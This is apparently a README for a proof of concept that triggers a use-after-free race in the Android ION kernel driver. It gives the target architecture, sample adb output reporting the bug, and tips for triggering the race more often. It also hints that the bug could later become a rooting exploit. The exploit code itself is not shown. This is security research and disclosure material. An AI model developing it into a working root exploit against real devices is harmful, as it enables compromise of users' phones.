# poc-ion-uaf
PoC of Android ION device causing UAF

There is a not-so-security bug in ion.c that allocating and freeing races on the same ion handle.

I will report this bug later with kernel stacktrace. To Google or upstream kernel? The bug is hard to be a root exploit now but might be used for rooting in the future.  

The code is targeting 64bits CPU such as ARM64 device or x86_64 emulator.

The result is typically like (on my Xiaomi Note 4x)
```
C:\Projects\poc-ion>adb shell /data/local/tmp/poc-ion
[*]server connected fd=4
[*]server connected fd=6
[*]server connected fd=6
[*]server connected fd=5
[+]Found UAF! data.handle=0xffffffc0
[+]Found UAF! data.handle=0xffffffc0
[+]Found UAF! data.handle=0xffffffc0
[+]Found UAF! data.handle=0xffffffc0
[+]Found UAF! data.handle=0xffffffc0
[+]Found UAF! data.handle=0xffffffc0
[+]Found UAF! data.handle=0xffffffc0
```
The data.handle values are small in normal cases, but might be filled with other value after UAF occurs.

To see values other than 0xffffffc0, you can
1. Do random normal things on your phone and pay attention. It took me at least 20 minutes to see other values.
2. Modify the code commented with "HELP ME" to trigger UAF more easily.

